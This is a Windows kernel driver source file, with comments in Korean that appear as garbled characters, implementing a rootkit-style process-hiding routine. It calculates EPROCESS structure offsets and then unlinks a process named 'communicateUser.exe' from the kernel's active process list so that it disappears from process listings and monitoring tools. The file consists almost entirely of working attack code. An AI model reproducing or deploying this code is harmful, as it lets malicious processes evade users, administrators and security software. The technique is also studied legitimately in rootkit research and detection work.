#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{
	// ������ ����ü EPROCESS ��� ���� ��ġ ���
	nameOffset = CalcProcessNameOffset();			// ���μ��� �̹��� �̸�
	pidOffset = CalcPIDOffset();					// PID
	listEntryOffset = pidOffset + sizeof(HANDLE);	// LIST_ENTRY

	if (pidOffset == 0 || nameOffset == 0)
		return FALSE;
	else
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
		return TRUE;
	}
}

extern "C"
VOID HideProcess()
{
	PLIST_ENTRY head, currentNode, prevNode;
	PEPROCESS eprocessStart;
	unsigned char* currentProcess = NULL;
	const char target[] = "communicateUser.exe";
	ANSI_STRING targetProcessName, currentProcessName;

	// ���� ���μ����� EPROCESS ù ���� �����Ѵ�.
	eprocessStart = IoGetCurrentProcess();
	head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
	RtlInitAnsiString(&targetProcessName, target);

	do
	{
		// LIST_ENTRY�κ��� EPROCESS ����ü ȹ��
		currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
		RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

		//Target Process���� Ȯ��
		if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
		{
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

			// TargetProcess�� ���� ����� ���� ��ũ�� TargetProcess�� ���� ��ũ�� �����Ѵ�.
			// (A->B->C->) to (A->C)
			prevNode = currentNode->Blink;
			prevNode->Flink = currentNode->Flink;

			// TargetProcess�� ���� ����� ���� ��ũ�� TargetProcess�� ���� ��ũ�� �����Ѵ�.
			// (A<-B<-C<-) to (A<-C)
			currentNode->Flink->Blink = prevNode;

			// TargetProcess�� ��ũ�� �ڽ����� ����
			currentNode->Flink = currentNode;
			currentNode->Blink = currentNode;
			break;
		}

		currentNode = currentNode->Flink;
	} while (currentNode->Flink != head);
	// EPROCESS�� ����� ���Ḯ��Ʈ�� ����Ǳ� ������ �ѹ� ��ȸ�ϸ� ���ڸ��� ���ƿ´�.
}